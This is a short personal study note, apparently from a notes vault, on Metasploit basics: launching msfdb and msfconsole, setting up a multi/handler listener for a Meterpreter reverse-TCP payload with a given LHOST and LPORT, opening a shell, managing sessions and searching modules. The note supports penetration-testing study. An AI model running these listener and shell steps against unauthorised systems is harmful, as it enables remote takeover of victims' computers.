
----

# To run the program

This run the Metasploit Framework Database **service**

> sudo msfdb run

or

This launch the Metasploit Framework console

> msfconsole

---- 

# Create listener
If you create a payload with [[Msfvenom]] you have to listener if the program is open with the next steps:
1.  Indicate the method that you are going to use
> 	use exploit/multi/handler
2.  Set the payload, in this case we use the established with msfvenom
>	set payload windows/x64/meterpreter/reverse_tcp
3. You can see the available options with:
> 	show options	
4. To put the option put this:
>	set LHOST 172.21.7.214
>	set LPORT 4646

5. Execute the program with this commands
>	run
>	exploit

6. To have an interactive shell you can put:
>	shell

7. To exit of interactive shell:
>	exit

----
# Put a session in background

You can put the session in background with this command

> background


## To see the session in background

> sessions


This is useful to upload modules

## Return to the session

> sessions -i NUMBEROFSESSION

-----

# Modules

## How to find modules

> search NAMEMODULE

### Module suggester

This module search potential ways to elevate privileges



----

# Tags

#tools #metasploit 

----